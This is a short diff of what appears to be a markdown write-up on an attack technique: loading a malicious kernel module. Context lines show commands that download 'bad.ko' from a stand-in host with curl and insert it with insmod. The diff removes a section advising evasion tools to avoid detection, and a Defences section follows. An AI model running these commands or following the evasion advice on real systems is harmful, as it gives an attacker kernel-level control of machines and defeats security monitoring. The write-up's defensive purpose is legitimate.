@@ -39,10 +39,6 @@ curl -O exploit.delivery/bad.ko
 insmod bad.ko
 ```
 
-## OPSEC Considerations
-
-Cloud Security Management has a number of rules related to kernel module loading. Overall this is a well-documented and monitored attack. Consider using evasion tools if privilege allows to avoid detection or consider alternative techniques.
-
 ## Defences
 
 ### Monitoring
